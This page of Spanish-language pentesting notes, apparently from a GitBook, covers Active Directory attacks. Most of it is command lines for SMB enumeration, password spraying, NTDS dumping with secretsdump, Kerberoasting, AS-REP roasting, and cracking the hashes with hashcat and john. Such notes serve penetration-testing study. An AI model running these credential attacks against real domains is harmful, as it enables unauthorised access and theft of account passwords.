# Active Directory

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Que nos encontramos en ese segmento de red.

```
crackmapexec smb IP # o poner segmento 192.168.4.128-132
```

Si no pide firma podemos hacer NTL relay. En el dominio principal por defecto está firmado.

Realizar escaneo de NMAP completo.

* Puerto 53: DNS
* Puerto 88: Kerberos
* Puerto 389: LDAP
* Puerto 445: SMB

Escaneo NMAP para ver el dominio.

```
nmap -n -P0 -p 53,88,389,445 --script smb-os-discovery.nse IP 
```

## Reconocimiento

Nos creamos un listado de usuarios con los que nos salen.

```
crackmapexec smb IP(AD) -u usuarios.txt -p diccionario.txt --continue-on-success
```

Para cuando sea solo a un ordenador y no al dominio principal.

```
crackmapexec smb IP -u usuarios.txt -p diccionario.txt --local-auth
```

Si pone **Pwned!** es que tiene altos privilegios.

```
crackmapexec smb IP -u usuario -p '1234' --continue-on-success
crackmapexec smb IP -u usuario -p '1234' --pass-pol #política de contraseñas
crackmapexec smb IP -u usuario -p '1234' --users
```

Dumpear la base de datos del dominio.

```
crackmapexec smb IP(AD) -u usuario -p '1234' --ntds
```

La estructura de la respuesta es -> Usuario:ID:LM HASH:NTHASH

Si pone **404ee** en el LM está deshabilitado.

Rompemos las contraseñas creando un diccionario con NTHASH.

{% embed url="https://hashes.com/en/decrypt/hash" %}

Contraseñas previas que se han configurado.

```
impacket-secretsdump -just-dc usuario:password@IP -history -pwd-last-secret
```

No se necesita ser administrador de dominio para realizar un ataque de **Keberoasting**.

```
impacket-GetUserSPNs -dc-ip IP(AD) dominio.com/usuario:'1234' -request
```

Cogemos la contraseña para crackear.

```
hashcat -m 13100(número depende) --force -a 0 hash diccionario.txt
john --format=krb5tgs --wordlist=diccionario.txt hash
```

Lo probamos.

```
crackmapexec smb IP(AD) -u SVC_SQLService -p '1234'
```

**AS -REP Roasting Attack**

```
impacket-GetNPUsers -dc-ip IP(AD) dominio.com/ -no-pass -userfile users.txt -outfile salida.txt
```
